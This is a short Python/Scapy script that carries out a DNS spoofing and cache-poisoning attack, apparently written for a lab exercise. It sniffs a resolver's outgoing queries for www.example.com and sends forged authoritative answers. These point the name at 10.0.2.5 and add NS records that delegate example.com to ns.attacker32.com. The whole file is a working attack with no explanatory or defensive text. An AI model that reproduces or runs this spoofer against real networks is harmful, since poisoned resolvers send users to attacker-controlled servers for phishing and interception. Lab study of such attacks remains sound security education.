#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
	if (DNS in pkt and "www.example.com" in pkt[DNS].qd.qname.decode("utf-8")):
		# Swap the source and destination IP address
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
		
		# Swap the source and destination port number
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
		
		# The Answer Section
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type="A",ttl=259200, rdata="10.0.2.5")
		
		# The Authority Section
		NSsec1 = DNSRR(rrname="example.com", type="NS",ttl=259200, rdata="ns.attacker32.com.")
		NSsec2 = DNSRR(rrname="example.com", type="NS",ttl=259200, rdata="ns.attacker32.com.")

		# Construct the DNS packet
		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=0, an=Anssec, ns=NSsec1/NSsec2)

		# Construct the entire IP packet and send it out
		spoofpkt = IPpkt/UDPpkt/DNSpkt
		send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = "udp and src host 10.9.0.53 and src port 33333"
pkt = sniff(iface="br-5e48dfe2a4b3", filter=f, prn=spoof_dns)
